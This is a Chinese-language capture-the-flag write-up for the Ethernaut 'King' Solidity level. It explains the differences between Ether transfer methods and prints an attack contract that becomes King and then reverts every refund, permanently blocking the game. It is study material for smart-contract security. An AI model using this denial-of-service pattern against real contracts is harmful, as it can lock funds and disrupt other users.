## 0x01 Task

```javascript
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}
```

谁给的钱多谁就能成为 King，并且将前任 King 付的钱归还。当提交 instance 时，题目会重新夺回 King 的位置，需要解题者阻止其他人成为 King。

## 0x02 Solution

首先需要讨论一下 Solidity 中几种转币方式。

```javascript
<address>.transfer()
```

- 当发送失败时会 `throw;` 回滚状态
- 只会传递部分 Gas 供调用，防止重入（reentrancy）

```javascript
<address>.send()
```

- 当发送失败时会返回 false
- 只会传递部分 Gas 供调用，防止重入（reentrancy）

```javascript
<address>.call.value()()
```

- 当发送失败时会返回 false
- 传递所有可用 Gas 供调用，不能有效防止重入（reentrancy）

回头再看一下代码，当我们成为 King 之后，如果有人出价比我们高，会首先把钱退回给我们，使用的是 `transfer()`。上面提到，当 `transfer()` 调用失败时会回滚状态，那么如果合约在退钱这一步骤一直调用失败的话，代码将无法继续向下运行，其他人就无法成为新的 King。

查看最高出价：

```javascript
fromWei((await contract.prize()).toNumber())
```

攻击合约：

```javascript
pragma solidity ^0.4.18;

contract Attack {
    address instance_address = instance_address_here;

    function Attack() payable{}

    function hack() public {
        instance_address.call.value(1.1 ether)();
    }

    function () public {
        revert();
    }
}
```

或

```java
contract.sendTransaction({value: toWei(1.01)})
```

